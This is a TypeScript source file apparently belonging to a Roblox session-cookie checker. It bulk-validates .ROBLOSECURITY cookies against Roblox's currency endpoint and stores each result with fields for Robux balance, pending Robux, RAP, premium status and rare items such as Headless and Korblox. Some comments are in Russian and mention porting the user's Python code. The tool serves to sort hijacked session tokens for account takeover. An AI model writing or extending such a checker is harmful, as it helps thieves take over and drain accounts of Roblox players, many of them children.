import fetch from "node-fetch";
import { queueService } from "./queueService";
import { storage } from "../storage";
import { RobloxAccount } from "@shared/types";

/**
 * Format a cookie for use in requests
 * @param cookie Raw Roblox cookie
 * @returns Properly formatted cookie string
 */
function formatCookie(cookie: string): string {
  // If the cookie already starts with _|WARNING, use it as is
  if (cookie.startsWith('_|WARNING')) {
    return cookie;
  }
  return cookie;
}

/**
 * Validate a batch of cookies asynchronously
 * @param cookies Array of cookies to validate
 */
export async function validateCookies(cookies: string[]): Promise<void> {
  if (!Array.isArray(cookies) || cookies.length === 0) {
    throw new Error("Invalid or empty cookies array provided");
  }

  // Reset the queue status
  queueService.resetStatus(cookies.length);
  
  // Enqueue each cookie for validation
  for (const cookie of cookies) {
    queueService.enqueue(async () => {
      try {
        // Check if cookie is valid
        const cookieValid = await checkCookieValid(cookie);
        
        // Create account info object
        const accountInfo: RobloxAccount = {
          cookie,
          isValid: cookieValid,
          username: cookieValid ? "Valid Account" : "",
          userId: "",
          robuxBalance: 0,
          pendingRobux: 0,
          premium: false,
          donations: 0,
          rap: 0,
          hasHeadless: false,
          hasKorblox: false,
          avatarUrl: "",
          processedAt: new Date().toISOString(),
        };
        
        // Store the result
        await storage.storeCookie(accountInfo);
        
        // Update queue status
        queueService.processingComplete(cookieValid);
        
        // Add to log
        queueService.addLogEntry(
          cookieValid
            ? `✓ Cookie is valid`
            : `✗ Cookie is invalid`
        );
      } catch (error: any) {
        console.error("Error validating cookie:", error);
        
        // Store invalid result
        const invalidAccount: RobloxAccount = {
          cookie,
          isValid: false,
          username: "",
          userId: "",
          robuxBalance: 0,
          pendingRobux: 0,
          premium: false,
          donations: 0,
          rap: 0,
          hasHeadless: false,
          hasKorblox: false,
          avatarUrl: "",
          processedAt: new Date().toISOString(),
        };
        
        await storage.storeCookie(invalidAccount);
        
        // Update queue status
        queueService.processingComplete(false);
        
        // Add to log
        queueService.addLogEntry(`✗ Invalid cookie - ${error.message || 'Unknown error'}`);
      }
    });
  }
  
  // Start processing the queue
  queueService.startProcessing();
}

/**
 * Simple check if a cookie is valid using Roblox API
 * Based on your Python example code
 * @param cookie Roblox cookie to validate
 * @returns Promise<boolean> indicating if cookie is valid
 */
async function checkCookieValid(cookie: string): Promise<boolean> {
  try {
    const cleanCookie = formatCookie(cookie);
    
    // Используем аналогичную проверку из вашего Python кода
    const response = await fetch('https://economy.roblox.com/v1/user/currency', {
      headers: {
        'Cookie': `.ROBLOSECURITY=${cleanCookie}`,
        'User-Agent': 'Mozilla/5.0'
      }
    });
    
    // Куки валидный, если получили успешный ответ
    return response.status === 200;
  } catch (error: any) {
    console.error(`Cookie validation failed: ${error.message || 'Unknown error'}`);
    return false;
  }
}